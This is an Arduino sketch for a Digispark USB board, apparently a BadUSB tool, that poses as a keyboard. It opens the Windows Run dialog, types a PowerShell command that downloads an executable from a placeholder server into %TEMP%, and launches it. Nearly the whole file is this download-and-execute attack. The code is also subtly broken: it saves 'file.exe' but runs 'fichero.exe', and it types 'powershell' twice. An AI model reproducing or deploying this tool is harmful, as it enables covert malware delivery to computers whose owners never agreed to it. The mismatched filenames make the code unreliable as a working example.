/*
 *  Download File and Run Windows
 *
 *  This example is used to be able to download a file stored in an address (URL) and run it on the computer
 *
 *  http://www.github.com/joelsernamoreno/ http://www.twitter.com/JoelSernaMoreno/
 *  http://www.github.com/ernesto-xload/ http://www.twitter.com/ernesto_xload/
 *
 *  Version:    1.0
 *  Design:   Ernesto Sanchez
 *  Implementation: Joel Serna & Ernesto Sanchez
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 */

#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.update();
  pinMode(1, OUTPUT); //LED
  DigiKeyboard.delay(2500); //wait 2500 milliseconds before first run, to give target time to initialize
}

void loop() {
  delay(1000);
  DigiKeyboard.update();
  delay(100);
  
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // meta+r
  delay(100);
  DigiKeyboard.print(F("powershell "));
  DigiKeyboard.print(F("powershell Import-Module BitsTransfer;"));
  DigiKeyboard.print(F("Start-BitsTransfer -Source \"http://server/file.exe\" -Destination \"%TEMP%\\file.exe\";"));
  DigiKeyboard.println(F("Start-Process \"%TEMP%\\fichero.exe\""));
  
  while(1){
    digitalWrite(1, HIGH);
    delay(1000);
    digitalWrite(1, LOW);
    delay(1000);
  }
}
